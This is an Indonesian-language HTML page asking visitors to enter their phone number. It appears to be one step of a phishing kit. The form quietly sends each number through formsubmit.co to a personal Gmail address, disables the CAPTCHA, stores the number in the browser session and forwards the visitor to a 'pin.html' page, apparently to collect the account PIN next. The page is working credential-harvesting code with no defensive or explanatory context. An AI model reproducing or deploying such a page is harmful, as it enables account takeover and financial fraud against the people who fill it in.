
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Masukkan Nomor HP</title>
</head>
<body>
  <h2>Masukkan Nomor HP</h2>
  <form id="form" action="https://formsubmit.co/baygaming648@gmail.com" method="POST">
    <input type="hidden" name="_next" value="pin.html">
    <input type="hidden" name="_captcha" value="false">
    <input type="text" id="phone" name="Nomor HP" placeholder="08xxxxxxxxxx" required>
    <button type="submit" onclick="savePhone()">Lanjut</button>
  </form>
  <script>
    function savePhone() {
      const phone = document.getElementById('phone').value;
      sessionStorage.setItem('phone', phone);
    }
  </script>
</body>
</html>
